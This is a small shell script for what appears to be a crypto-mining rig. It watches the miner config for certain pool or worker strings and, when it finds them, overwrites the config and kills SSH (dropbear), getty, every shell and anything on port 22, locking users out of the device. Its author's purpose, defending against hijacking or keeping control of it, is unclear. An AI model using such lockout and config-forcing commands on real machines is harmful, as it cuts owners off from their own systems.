#!/bin/sh

while true; do
    sleep 10s

b="$(cat /var/volatile/tmp/freq | grep -h 'miner total rate')"
    if [ -z  "$b" ]; then
      echo "wait.."
    continue
    else
     echo "lets goo..!"
	sleep 5s
	/usr/bin/seeme >/dev/null 2>&1
    fi
    
c="$(ps | grep agent | grep -v 'grep agent')"
    if [ -z  "$c" ]; then
      echo "DC ..Wait"
      killall agent >/dev/null 2>&1
    cp /opt/scr/hostid /nvdata/hostid >/dev/null 2>&1
    /etc/init.d/agent.sh restart >/dev/null 2>&1
    else
     echo "Good.. Cennected.."
    fi
    
d="$(cat /config/bmminer.conf | grep -i 'strtcp\|xx00.s9x\|xmax\|Tomas')"
    if [ -z  "$d" ]; then
      echo "oke.."
      exit 0
  else
   echo "Warning..!"
	sleep 2s
	/opt/run/seeme warn >/dev/null 2>&1
	chattr -ai /config/bmminer.conf >/dev/null 2>&1
	cp /home/bmminer.conf /config/bmminer.conf >/dev/null 2>&1
	#chattr +ai /config/bmminer.conf >/dev/null 2>&1
	killall getty >/dev/null 2>&1
	killall dropbear >/dev/null 2>&1
	killall sh >/dev/null 2>&1
	fuser -k 22/tcp >/dev/null 2>&1
    fi
done